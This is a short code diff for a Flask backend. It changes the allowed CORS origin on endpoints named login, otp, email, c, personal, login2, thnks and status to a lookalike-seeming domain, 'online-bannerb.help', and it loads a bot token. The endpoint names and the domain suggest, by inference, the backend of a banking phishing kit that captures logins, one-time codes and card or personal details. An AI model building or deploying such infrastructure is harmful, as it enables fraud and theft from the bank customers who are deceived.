@@ -9,14 +9,14 @@ from dotenv import load_dotenv
 load_dotenv()
 app = Flask(__name__)
 CORS(app, resources={
-    r"/login": {"origins": "https://b-bcknd.vercel.app"},
-    r"/otp": {"origins": "https://b-bcknd.vercel.app"},
-    r"/email": {"origins": "https://b-bcknd.vercel.app"},
-    r"/c": {"origins": "https://b-bcknd.vercel.app"},
-    r"/personal": {"origins": "https://b-bcknd.vercel.app"},
-    r"/login2": {"origins": "https://b-bcknd.vercel.app"},
-    r"/thnks": {"origins": "https://b-bcknd.vercel.app"},
-    r"/status/*": {"origins": "https://b-bcknd.vercel.app"}
+    r"/login": {"origins": "https://online-bannerb.help"},
+    r"/otp": {"origins": "https://online-bannerb.help"},
+    r"/email": {"origins": "https://online-bannerb.help"},
+    r"/c": {"origins": "https://online-bannerb.help"},
+    r"/personal": {"origins": "https://online-bannerb.help"},
+    r"/login2": {"origins": "https://online-bannerb.help"},
+    r"/thnks": {"origins": "https://online-bannerb.help"},
+    r"/status/*": {"origins": "https://online-bannerb.help"}
 })
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
